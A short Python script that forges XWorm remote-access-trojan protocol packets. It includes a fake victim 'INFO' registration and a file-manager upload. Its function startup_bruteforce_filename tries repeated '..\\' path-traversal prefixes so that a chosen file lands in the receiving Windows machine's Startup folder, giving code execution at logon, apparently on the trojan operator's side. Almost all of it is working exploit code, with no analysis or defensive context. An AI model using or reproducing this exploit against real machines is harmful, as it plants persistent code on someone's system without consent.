from xworm import Packet, compress
import os
class Info(Packet):
    def __init__(self, clid: str, user: str, os: str, xworm_ver: str, date: str, usb: str, uac: str, webcam: str, antivirus: str):
        super().__init__(b'INFO', *(i.encode('utf-8') for i in (clid, user, os, xworm_ver, date, usb, uac, webcam, antivirus)))
    
    def __str__(self):
        return f'InfoV3: [{", ".join(d.decode("utf-8") for d in self.data[1:])}]'

class FMHandshake(Packet):
    def __init__(self, clid: str):
        super().__init__(b'FileM', clid.encode('utf-8'))
    
class FMDownload(Packet):
    def __init__(self, clid: str, file: str, filename: str):
        with open(file, 'rb') as f:
            super().__init__(b'downloadedfile', clid.encode('utf-8'), compress(f.read()), filename.encode('utf-8'))


def startup_bruteforce_filename(clid: str, filename: str, depth: int = 15, inject_packet_between = lambda _1, _2: []):
    p = [FMHandshake(clid)]
    for i in range(2, depth + 3):
        p.append(FMDownload(clid, filename, '..\\' * i + 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(filename)))
        p += inject_packet_between(clid, clid.encode('utf-8'))
    return p